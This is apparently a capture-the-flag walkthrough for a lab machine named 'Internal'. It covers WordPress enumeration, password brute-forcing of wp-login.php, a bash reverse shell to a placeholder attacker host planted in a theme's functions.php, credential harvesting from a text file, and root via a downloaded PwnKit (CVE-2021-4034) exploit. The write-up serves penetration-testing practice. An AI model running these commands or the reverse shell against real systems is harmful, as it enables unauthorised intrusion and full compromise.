# Internal

## Challenge Information
- **Challenge Name**: Internal
- **Category**: Web Penetration Testing
- **Difficulty Level**: Hard

## Analysis

1. As the instructions were given to add the internal.thm to hosts file of our system, so i did so.
Add `<ip_address>    internal.thm` in the hosts file:
```
sudo nano /etc/hosts
```

2. Then I did directory brute forcing on the web app:
```
ffuf -u http://internal.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c -mc 200,301,302,403
```
And found some directories as well:
```
blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 4686ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 3741ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 260ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 265ms]   
```
Out of these, only **blog** and **phpmyadmin** were accessible.

3. Now I ran a **WPScan** on the blog directory:
```bash
wpscan --url http://internal.thm/blog/ --enumerate u,ap
```
Here are the results of this scan:
  - WordPress Version: 5.4.2 (outdated, released 2020-06-10, contains multiple known vulnerabilities including XSS and privilege escalation flaws).
  - Theme: Twenty Seventeen v2.3 (outdated; latest version is 3.9).
  - XML-RPC: Enabled at /xmlrpc.php (possible brute-force amplification and SSRF vector).
  - WP-Cron: Accessible externally (/wp-cron.php) — can be abused for scheduled execution if admin access is gained.
  - Readme File: Found at /readme.html — confirms version information to an attacker.
  - User Enumeration: One valid user identified: admin.
  - Admin Login Page: Located at `http://internal.thm/blog/wp-login.php`.

4. Since we found a login page, lets try the traditional **admin:admin** as credentials, but it failed. Instead, we got a hint that the password for this username is incorrect. It means that the admin username exists. We can confirm this by entering any random username which gives different error response. So, lets brute force the password using fuff:
```
ffuf -w /usr/share/wordlists/rockyou.txt -u http://internal.thm/blog/wp-login.php -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
-d "log=admin&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=0" \
-mc 302
```
And boom! We found the password **my2boys**. Now login with this username and it will take us to the admin dashboard.

5. Since we have got the admin panel access, the most easiest way to get RCE is to compromise the **Theme/Plugin Editor**: Directly modify **functions.php** or another template file to add a PHP reverse shell. Go to **Appearance** → **Theme File Editor**. Instead of replacing everything, keep the original content and add this at the very bottom, before the last ?> (or just at the end if there’s no closing tag):
```
// Reverse shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'");

```

Start listener before triggering
```
nc -lvnp 4444
```
Then load any page of the WordPress site to trigger the shell.

6. The shell was obtained as the `www-data` user. Next, I performed basic enumeration to check OS details, kernel version, and potential privilege escalation vectors:
```
uname -a
lsb_release -a
find / -perm -4000 2>/dev/null
```
I also checked for readable files inside `/home/aubreanna` but encountered a permission denied error. Proceeded to search for any files owned by `aubreanna` that were world-readable:
```
find / -user aubreanna -type f -readable 2>/dev/null
```
No useful results found initially.

7. So, I decided to extended the search to suspected directories, starting with `/opt`:

```
# Find all readable files in a specific directory
find /home/aubreanna -type f -readable 2>/dev/null

# Find all readable files under /opt
find /opt -type f -readable 2>/dev/null

# Find potentially interesting files by extension
find /home/aubreanna /opt /var/backups /var/www -type f \( -name "*.sh" -o -name "*.txt" -o -name "*.conf" -o -name "*.bak" -o -name "*.php" \) -readable 2>/dev/null
```
Here, I discovered a file `/opt/wp-save.txt` containing credentials:
```
aubreanna:bubb13guM!@#123
```
So, I used these credentials to switch user. But before that, lets make our shell stable first:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
su aubreanna
```
Password was accepted, and I gained a shell as `aubreanna`. Read the user flag at: `/home/aubreanna/user.txt`.

8. Now, as user **aubreanna**, I checked for `sudo` privileges but found that this user cannot run `sudo`:
```
sudo -l
```
Result:
```
Sorry, user aubreanna may not run sudo on internal.
```
So I enumerated SUID binaries to look for privilege escalation vectors:
```
find / -perm -4000 2>/dev/null
```
The list included `/usr/bin/pkexec`, which is known to be vulnerable to **CVE-2021-4034 (PwnKit)** if unpatched.
I confirmed its version:
```
/usr/bin/pkexec --version
```
Output:
```
pkexec version 0.105
```
This version is vulnerable.

9. To exploit **PwnKit**, I downloaded a public exploit (compiled binary) from my attacker machine using `curl`:
```
# Attacker Machine
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
python3 -m http.server 8000

# Compromised Machine
curl -fsSL http://<attacker_ip>:8000/PwnKit -o /tmp/PwnKit
chmod +x /tmp/PwnKit
```
Then executed it:
```
cd /tmp
./PwnKit
```
Boom! I instantly got a **root shell**:
```
root@internal:/tmp# whoami
root
```
Finally, I grabbed the root flag located at `/root/root.txt`:
```
cat /root/root.txt
```

---
